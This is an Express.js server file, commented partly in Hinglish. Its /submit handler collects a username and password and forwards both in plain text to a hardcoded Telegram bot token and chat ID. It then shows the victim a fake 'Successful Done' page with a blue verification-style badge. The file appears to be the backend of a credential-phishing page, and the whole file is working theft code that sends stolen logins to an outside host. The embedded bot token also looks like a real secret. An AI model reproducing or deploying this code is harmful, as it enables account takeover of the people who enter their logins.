const express = require('express');
const https = require('https');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const TELEGRAM_BOT_TOKEN = '8957531455:AAH5F5NVTBvUb4cU721SVDu-VXGfZG3ME-Y';
const TELEGRAM_CHAT_ID = '7611064372';

app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    // Telegram ka URL jahan data bhejna hai
 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=Username: ${username} Password: ${password}`;

    https.get(url, (telegramRes) => {
        let data = '';
        telegramRes.on('data', (chunk) => {
            data += chunk;
        });
        telegramRes.on('end', () => {
            console.log("Telegram Response:", data);
        });
    }).on('error', (err) => {
        console.log("Error:", err.message);
    });

    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Successful Done</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #0f172a;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .card {
                text-align: center;
                background: #1e293b;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            }
            .badge {
                width: 100px;
                height: 100px;
                background-color: #0095f6;
                display: inline-block;
                position: relative;
                clip-path: polygon(50% 0%, 65% 10%, 80% 5%, 88% 20%, 100% 30%, 95% 45%, 100% 60%, 88% 70%, 80% 85%, 65% 80%, 50% 100%, 35% 80%, 20% 85%, 12% 70%, 0% 60%, 5% 45%, 0% 30%, 12% 20%, 20% 5%, 35% 10%);
                margin-bottom: 20px;
            }
            .tick {
                color: white;
                font-size: 50px;
                line-height: 100px;
                font-weight: bold;
            }
            h1 {
                color: white;
                font-size: 24px;
                margin: 0;
            }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="badge">
                <div class="tick">&#10003;</div>
            </div>
            <h1>Successful Done</h1>
        </div>
    </body>
    </html>
`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});